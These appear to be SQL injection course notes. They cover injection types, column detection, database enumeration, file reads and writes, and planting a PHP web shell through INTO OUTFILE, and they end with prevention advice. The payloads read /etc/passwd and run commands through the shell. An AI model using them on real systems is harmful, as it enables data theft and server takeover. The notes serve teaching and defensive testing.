# SQL Injection Fundamentals

## Operator Precedence

SQL operators are evaluated in the following order:

1. **Division (/)**, **Multiplication (*)**, and **Modulus (%)**
2. **Addition (+)** and **Subtraction (-)**
3. **Comparison** (=, >, <, <=, >=, !=, LIKE)
4. **NOT (!)**
5. **AND (&&)**
6. **OR (||)**

---

## SQL Injection Types

```
SQL Injection
├── In-band SQLi
│   ├── Union-based
│   └── Error-based
├── Blind SQLi
│   ├── Boolean-based
│   └── Time-based
└── Out-of-band SQLi
```

### Type Descriptions

| Type              | Description                                        | Detection Method                   |
| ----------------- | -------------------------------------------------- | ---------------------------------- |
| **Union-based**   | Combines malicious query with original using UNION | Direct output in response          |
| **Error-based**   | Extracts data through database error messages      | Error messages reveal data         |
| **Boolean-based** | Uses conditional responses (true/false)            | Different responses for true/false |
| **Time-based**    | Uses time delays to confirm injection              | Response time differences          |
| **Out-of-band**   | Uses external channels (DNS, HTTP)                 | External server receives data      |

---

## SQLi Discovery

### Detection Signs
To identify SQL injection vulnerabilities, look for:
- Different content/error messages
- Different response codes (for API endpoints)
- Different response times

### Common Test Payloads

| Payload | URL Encoded | Purpose                      |
| ------- | ----------- | ---------------------------- |
| `'`     | `%27`       | String delimiter             |
| `"`     | `%22`       | Alternative string delimiter |
| `#`     | `%23`       | MySQL comment                |
| `;`     | `%3B`       | Statement terminator         |
| `)`     | `%29`       | Parenthesis closer           |

### Testing Notes
- URL encode payloads when necessary to prevent URL breaking
- Test each entry point systematically
- Document different responses for analysis

---

## Payload Context

### Comment Usage
- Use comments to prevent syntax errors: `-- -` or `#`
- MariaDB requires space or character after `--`
- Safe format: `-- -` (dash after space)

### Query Structure Considerations
- Backend queries may have multiple WHERE conditions
- Parentheses may be used in original query
- Test different payload endings to match query structure

---

## UNION-based Injection

### Requirements for UNION
1. **Same number of columns** in both SELECT statements
2. **Compatible data types** in corresponding columns

### Column Detection Techniques

#### Using ORDER BY
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
Increment until error occurs to find total column count.

#### Using UNION SELECT
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```
Add NULL values until no error occurs.

### UNION Payload Structure
```sql
' UNION SELECT NULL,NULL,NULL-- -
```
Use NULL to fill columns as it's compatible with all data types.

---

## Database Fingerprinting

### DBMS Detection

| Payload            | Database      | Expected Output | Notes                    |
| ------------------ | ------------- | --------------- | ------------------------ |
| `SELECT @@version` | MySQL/MariaDB | Version string  | Full query output needed |
| `SELECT POW(1,1)`  | MySQL         | `1`             | Numeric output only      |
| `SELECT SLEEP(5)`  | MySQL         | 5-second delay  | Blind injection          |

### Version Information
- **Apache/Nginx** web servers typically use **MySQL**
- Use fingerprinting to confirm DBMS type before enumeration

---

## Database Enumeration

### Information Schema Structure

```
INFORMATION_SCHEMA
├── SCHEMATA (databases)
├── TABLES (table names)
├── COLUMNS (column details)
└── USER_PRIVILEGES (permissions)
```

### Enumeration Queries

#### Database Names
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
```

#### Table Names
```sql
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='database_name'
```

#### Column Information
```sql
SELECT COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='table_name'
```

### User Information

#### Current User
```sql
SELECT USER()
SELECT * FROM mysql.user LIMIT 1
```

#### User Privileges
```sql
SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE LIKE '%username%'
```

| Column           | Description       |
| ---------------- | ----------------- |
| `GRANTEE`        | Username          |
| `PRIVILEGE_TYPE` | Type of privilege |

---

## File Operations

### secure_file_priv Variable

| Value              | Permission                             |
| ------------------ | -------------------------------------- |
| **Empty**          | Read/write anywhere                    |
| **Directory path** | Read/write only in specified directory |
| **NULL**           | No file operations allowed             |

#### Check secure_file_priv
```sql
SHOW VARIABLES LIKE 'secure_file_priv'
SELECT * FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME='secure_file_priv'
```

#### Default Values
- **MariaDB**: Empty (unrestricted)
- **MySQL**: `/var/lib/mysql-files/`

### Reading Files
```sql
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('/var/www/html/config.php')
```

### Writing Files
```sql
SELECT 'content' INTO OUTFILE '/path/to/file.txt'
UNION SELECT 'web shell code' INTO OUTFILE '/var/www/html/shell.php'-- -
```

#### Requirements for File Writing
1. User has **FILE** privilege
2. `secure_file_priv` allows target location
3. User has write access to target directory

---

## Web Shell Exploitation

### Process Overview
1. **Identify web root directory**
2. **Write web shell file**
3. **Access shell via web browser**

### Common Web Root Directories

| OS          | Common Paths                                            |
| ----------- | ------------------------------------------------------- |
| **Linux**   | `/var/www/html/`, `/var/www/`, `/usr/share/nginx/html/` |
| **Windows** | `C:\inetpub\wwwroot\`, `C:\xampp\htdocs\`               |

### Web Shell Examples

#### PHP Web Shell
```php
<?php system($_REQUEST[0]); ?>
```

#### Complete Injection
```sql
UNION SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

#### Usage
```
http://target.com/shell.php?0=ls
http://target.com/shell.php?0=whoami
http://target.com/shell.php?0=cat /etc/passwd
```

---

## Prevention Measures

### Input Validation
- **Sanitize all user inputs**
- **Validate input formats and types**
- **Use whitelist validation where possible**

### Database Security
- **Principle of least privilege** for database users
- **Separate users** for different application functions
- **Remove unnecessary privileges** from web application users

### Application Security
- **Parameterized queries/Prepared statements**
- **Web Application Firewalls (WAF)**
- **Regular security testing and code reviews**

### Architecture Security
- **Database isolation** from web servers
- **Network segmentation**
- **Regular updates and patching**


